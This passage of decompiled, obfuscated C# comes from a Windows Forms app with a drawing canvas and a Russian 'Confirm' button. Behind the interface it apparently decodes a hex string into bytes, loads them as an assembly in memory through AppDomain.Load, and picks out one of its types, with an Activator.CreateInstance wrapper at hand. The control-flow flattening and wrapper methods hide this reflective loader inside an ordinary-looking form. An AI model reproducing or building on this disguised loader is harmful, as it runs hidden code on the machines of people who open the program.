					num = (int)((num2 * 1747028945) ^ 0x5F68D9C9);
					continue;
				case 8u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 482528715) ^ -676106494;
					continue;
				case 7u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 1076808011) ^ -599858748;
					continue;
				case 6u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)((num2 * 206847091) ^ 0x6C5C0291);
					continue;
				case 5u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -581597299) ^ -76191555;
					continue;
				case 4u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -631336130) ^ -1078338065;
					continue;
				case 3u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 29015249) ^ -1307919520;
					continue;
				case 2u:
					num = (int)((num2 * 1671702024) ^ 0x6F312514);
					continue;
				case 1u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1223011753) ^ -512976059;
					continue;
				case 0u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 186651319) ^ -1195417113;
					continue;
				default:
					return;
				case 64u:
					break;
				case 118u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = 1180646114;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x23C8F5BDu) % 4u)
				{
				case 3u:
					q = ContextAdd(Level);
					num = ((int)num2 * -979362985) ^ 0x4B9B7F8A;
					continue;
				case 2u:
					PerformTable(q);
					num = ((int)num2 * -19519079) ^ 0x787F0762;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -79676668;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD9BA5487u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)(num2 * 36112870) ^ -1534481892;
					continue;
				case 1u:
					num = ((int)num2 * -878443854) ^ 0x1DCC03B;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
